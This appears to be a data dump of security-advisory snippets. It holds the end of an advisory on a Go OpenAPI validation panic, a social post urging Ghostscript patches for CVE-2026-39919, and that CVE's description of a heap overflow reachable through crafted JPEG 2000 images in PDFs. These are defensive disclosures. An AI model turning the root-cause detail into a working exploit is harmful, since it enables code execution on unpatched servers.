- **Consequence:** deterministic panic on every request to the operation. With stock `net/http`, the server logs `http: panic serving` and aborts the connection; without per-request recover (common outside pure `net/http` handlers), the process can crash.
- **Not affected:** OpenAPI 3.0 documents (spec validation rejects missing `items`); JSON request bodies (different decoder path that does not hit this `Items.Value` inspection).

posts.content:
Critical Ghostscript Flaw Allows Remote Code Execution via PDF Uploads

Artifex Ghostscript versions 9.21 to 10.07.1 contain a critical heap buffer overflow (CVE-2026-39919) that allows unauthenticated remote code execution via crafted PDF uploads. The flaw impacts web platforms like WordPress that use Ghostscript for document processing and thumbnail generation.

**If your servers or websites (including WordPress) create previews or thumbnails from uploaded PDFs, update Ghostscript to version 10.08.0 (or your Linux vendor's patched package) ASAP, and rebuild any containers from updated images. If you can't patch immediately, turn off PDF processing in ImageMagick or stop accepting PDF uploads from anyone you don't trust.**
#cybersecurity #infosec #advisory #vulnerability
https://beyondmachines.net/event_details/critical-ghostscript-flaw-allows-remote-code-execution-via-pdf-uploads-d-z-g-j-w/gD2P6Ple2L

CVE-2026-39919.description: Ghostscript before 10.08.0 contains a heap-based buffer overflow vulnerability in the JPEG 2000 output adapter (base/sjpx_openjpeg.c) that allows attackers to cause memory corruption by supplying a crafted PDF containing a JPEG 2000 image with mismatched component subsampling factors. When image components declare different subsampling values, the non-samescale sub-byte-depth output path allocates a row buffer sized for packed output but writes a full byte per output column regardless of bit depth, overflowing the allocation and corrupting internal chunk-allocator metadata to achieve code execution.
